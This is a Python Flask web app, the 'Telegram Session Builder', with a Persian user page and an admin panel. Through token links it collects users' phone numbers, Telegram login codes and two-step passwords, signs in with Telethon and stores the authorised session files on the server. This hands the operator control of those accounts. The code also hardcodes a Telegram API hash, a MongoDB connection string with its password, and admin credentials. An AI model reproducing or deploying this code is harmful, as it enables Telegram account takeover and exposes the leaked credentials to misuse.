# ================================================================
# Telegram Session Builder – FULL FINAL VERSION (UI + ADMIN)
# By: Tiam
# ================================================================

import os, asyncio, threading, secrets, time, shutil
from datetime import datetime
from flask import Flask, request, jsonify, render_template_string, redirect
from telethon import TelegramClient
from telethon.errors import SessionPasswordNeededError, PhoneCodeInvalidError
from pymongo import MongoClient
import requests

# ===================== CONFIG ===================================
CONFIG = {
    "api_id": 24645053,
    "api_hash": "88c0167b74a24fac0a85c26c1f6d1991",
    "admin_username": "tiam",
    "admin_password": "tiam_khorshid",
    "save_path": "sessions",
    "base_url": "https://anime-1127-bot-2.onrender.com",
    "device_name": "⦁ 𝑺𝒆𝒍𝒇 𝑵𝒊𝒙"
}

os.makedirs(CONFIG["save_path"], exist_ok=True)

# ===================== MongoDB ==================================
mongo = MongoClient(
    "mongodb://strawhatmusicdb_db_user:db_strawhatmusic@"
    "ac-hw2zgfj-shard-00-00.morh5s8.mongodb.net:27017,"
    "ac-hw2zgfj-shard-00-01.morh5s8.mongodb.net:27017,"
    "ac-hw2zgfj-shard-00-02.morh5s8.mongodb.net:27017/"
    "?replicaSet=atlas-7m1dmi-shard-0&ssl=true&authSource=admin"
)

db = mongo.telegram_sessions
sessions_col = db.sessions
links_col = db.links

# ===================== Flask ====================================
app = Flask(__name__, static_folder="static")

# ===================== Async Loop ================================
loop = asyncio.new_event_loop()
threading.Thread(target=lambda: (asyncio.set_event_loop(loop), loop.run_forever()), daemon=True).start()

def run_async(coro):
    return asyncio.run_coroutine_threadsafe(coro, loop).result()

# ===================== Utils ====================================
clients = {}

def gen_token():
    return secrets.token_urlsafe(8)

def consume_link(token):
    link = links_col.find_one({"token": token})
    if not link:
        return False
    if link["used"] + 1 >= link["max"]:
        links_col.delete_one({"token": token})
    else:
        links_col.update_one({"token": token}, {"$inc": {"used": 1}})
    return True

def normalize_phone(phone):
    phone = phone.strip()
    if phone.startswith("0"):
        return "+98" + phone[1:]
    if phone.startswith("9") and len(phone) == 10:
        return "+98" + phone
    return phone

def delete_session(phone):
    path = os.path.join(CONFIG["save_path"], phone)
    if os.path.exists(path):
        shutil.rmtree(path)
    sessions_col.delete_one({"phone": phone})

# ===================== HTML USER PANEL ===========================
HTML_PAGE = """
<!DOCTYPE html>
<html lang="fa">
<head>
<meta charset="UTF-8">
<title>Telegram Session Builder</title>
<meta name="viewport" content="width=device-width, initial-scale=1">
<style>
body{
    background:url('/static/images/astronomy-1867616_1280.jpg') no-repeat center center fixed;
    background-size:cover;
    font-family:tahoma;
    direction:rtl;
    color:white;
}
.box{
    width:170px;
    margin:80px auto;
    padding:10px 22px;
    background:rgba(15,23,42,0.88);
    border-radius:14px;
    text-align:center;
}
input, button{
    width:70%;
    padding:4px;
    margin-top:6px;
    border-radius:5px;
    border:none;
    font-size:13px;
    display:block;
    margin-left:auto;
    margin-right:auto;
}
input{
    direction:ltr;
    text-align:center;
}
button{
    background:#6366f1;
    color:white;
    cursor:pointer;
    transition:0.2s;
}
button:active, button.active{
    background:#22c55e !important;
    transform:scale(0.97);
}
#deleteBtn{
    background:#f87171;
    font-size:11px;
    display:none;
}
#done{
    display:none;
    margin-top:10px;
}
</style>
</head>
<body>

<div class="box">
<h3 id="titleText">ساخت سشن تلگرام</h3>
<input id="mainInput" placeholder="+98xxxxxxxxxx">
<div id="buttonsWrapper">
    <button id="mainBtn" onclick="nextStep()">دریافت کد</button>
    <button id="deleteBtn" onclick="deleteSession()">حذف سشن قبلی</button>
</div>
<div id="done"><h3>✅ سشن ساخته شد</h3></div>
</div>

<script>
let step = "phone";
let phone = "";

function nextStep(){
    const mainBtn = document.getElementById("mainBtn");
    mainBtn.classList.add("active"); // تغییر رنگ هنگام کلیک

    let v = document.getElementById("mainInput").value;

    if(step === "phone"){
        phone = v;
        fetch("/check_phone",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({phone})})
        .then(r=>r.json()).then(d=>{
            if(d.status==="exists"){
                document.getElementById("deleteBtn").style.display="block"; // نمایش دکمه حذف
            } else {
                sendPhone();
            }
        });
    } else if(step==="code"){
        fetch("/send_code",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({phone,code:v})})
        .then(r=>r.json()).then(d=>{
            if(d.status==="2fa"){
                step="password";
                preparePasswordStep();
            }else if(d.status==="ok"){finish();}
            else alert("کد اشتباه است");
        });
    } else if(step==="password"){
        fetch("/send_password",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({phone,password:v})})
        .then(()=>finish());
    }
}

function preparePasswordStep(){
    const mainInput = document.getElementById("mainInput");
    const mainBtn = document.getElementById("mainBtn");
    const title = document.getElementById("titleText");
    
    step = "password";
    mainInput.type = "password";
    mainInput.value = ""; // پاک کردن نوشته قبلی
    mainInput.placeholder = "رمز دو مرحله‌ای";
    mainBtn.innerText = "تأیید رمز";
    document.getElementById("deleteBtn").style.display = "none"; // مخفی کردن دکمه حذف
    title.innerText = "وارد کردن رمز دو مرحله‌ای";
}

function deleteSession(){
    fetch("/delete_session",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({phone})})
    .then(()=> {
        alert("سشن قبلی حذف شد");
        document.getElementById("deleteBtn").style.display="none";
        sendPhone();
    });
}

function sendPhone(){
    fetch("/send_phone",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({phone})})
    .then(()=>{
        step="code";
        const mainInput = document.getElementById("mainInput");
        const mainBtn = document.getElementById("mainBtn");
        mainInput.value = "";
        mainInput.placeholder = "کد تأیید تلگرام";
        mainBtn.innerText="تأیید کد";
        document.getElementById("titleText").innerText = "دریافت کد تأیید";
        document.getElementById("deleteBtn").style.display = "none";
    });
}

// ======================= finish() با ثبت زمان =======================
function finish(){
    const timestamp = new Date().toISOString(); // زمان ساخت سشن
    fetch("/register_session_time",{
        method:"POST",
        headers:{"Content-Type":"application/json"},
        body:JSON.stringify({phone, created: timestamp})
    });
    
    document.getElementById("mainInput").style.display="none";
    document.getElementById("mainBtn").style.display="none";
    document.getElementById("done").style.display="block";
}
 
setInterval(()=>fetch("/ping"),240000);
</script>
</body>
</html>
"""

# ===================== ADMIN PANEL ==============================
ADMIN_HTML = """
<!DOCTYPE html>
<html lang="fa">
<head>
<meta charset="UTF-8">
<title>پنل مدیریت</title>
<style>
body{background:#111;color:white;font-family:tahoma}
table{width:80%;margin:20px auto;border-collapse:collapse}
th,td{border:1px solid #555;padding:8px;text-align:center}
button{padding:6px 10px;cursor:pointer;transition:0.2s;}
button:active{transform:scale(0.97);}
</style>
</head>
<body>

<h2 style="text-align:center">پنل مدیریت</h2>

<form method="post" style="text-align:center">
<input name="max" type="number" value="1" min="1">
<button type="submit">ساخت لینک</button>
</form>

<table>
<tr><th>توکن</th><th>استفاده</th><th>حداکثر</th><th>عملیات</th></tr>
{% for l in links %}
<tr>
<td>{{ l.token }}</td>
<td>{{ l.used }}</td>
<td>{{ l.max }}</td>
<td>
<button onclick="copyLink('{{ l.token }}')">کپی</button>
<button onclick="del('{{ l.token }}')">حذف</button>
</td>
</tr>
{% endfor %}
</table>

<script>
function copyLink(t){
    navigator.clipboard.writeText("{{ CONFIG.base_url }}/?key="+t);
    alert("لینک کپی شد");
}
function del(t){
    fetch("/admin/delete_link",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({token:t})})
    .then(()=>location.reload());
}
</script>

</body>
</html>
"""

# ===================== ROUTES ===================================
@app.route("/")
def home():
    key = request.args.get("key")
    if not key or not consume_link(key):
        return "❌ لینک نامعتبر"
    return render_template_string(HTML_PAGE)

@app.route("/ping")
def ping():
    return "OK"

@app.route("/check_phone", methods=["POST"])
def check_phone():
    phone = normalize_phone(request.json["phone"])
    return jsonify(status="exists" if sessions_col.find_one({"phone": phone}) else "ok")

@app.route("/delete_session", methods=["POST"])
def del_sess():
    delete_session(normalize_phone(request.json["phone"]))
    return jsonify(ok=True)

async def create_client(phone):
    c = TelegramClient(os.path.join(CONFIG["save_path"], phone), CONFIG["api_id"], CONFIG["api_hash"], device_model=CONFIG["device_name"])
    await c.connect()
    return c

@app.route("/send_phone", methods=["POST"])
def send_phone():
    phone = normalize_phone(request.json["phone"])
    async def job():
        c = await create_client(phone)
        clients[phone] = c
        await c.send_code_request(phone)
    run_async(job())
    return jsonify(ok=True)

@app.route("/send_code", methods=["POST"])
def send_code():
    phone = normalize_phone(request.json["phone"])
    try:
        run_async(clients[phone].sign_in(phone, request.json["code"]))
        sessions_col.insert_one({"phone": phone, "created": datetime.utcnow()})
        return jsonify(status="ok")
    except SessionPasswordNeededError:
        return jsonify(status="2fa")
    except PhoneCodeInvalidError:
        return jsonify(status="error")

@app.route("/send_password", methods=["POST"])
def send_password():
    phone = normalize_phone(request.json["phone"])
    run_async(clients[phone].sign_in(password=request.json["password"]))
    sessions_col.insert_one({"phone": phone, "created": datetime.utcnow()})
    return jsonify(ok=True)

@app.route("/admin", methods=["GET","POST"])
def admin():
    a = request.authorization
    if not a or a.username != CONFIG["admin_username"] or a.password != CONFIG["admin_password"]:
        return ("Unauthorized", 401, {"WWW-Authenticate": "Basic"})
    if request.method == "POST":
        links_col.insert_one({"token": gen_token(), "max": int(request.form["max"]), "used": 0})
        return redirect("/admin")
    return render_template_string(ADMIN_HTML, links=list(links_col.find()), CONFIG=CONFIG)

@app.route("/admin/delete_link", methods=["POST"])
def del_link():
    links_col.delete_one({"token": request.json["token"]})
    return jsonify(ok=True)

# ===================== KEEP ALIVE ================================
def keep_alive():
    while True:
        try: requests.get(CONFIG["base_url"] + "/ping", timeout=10)
        except: pass
        time.sleep(240)

threading.Thread(target=keep_alive, daemon=True).start()

# ===================== RUN =======================================
if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8000)
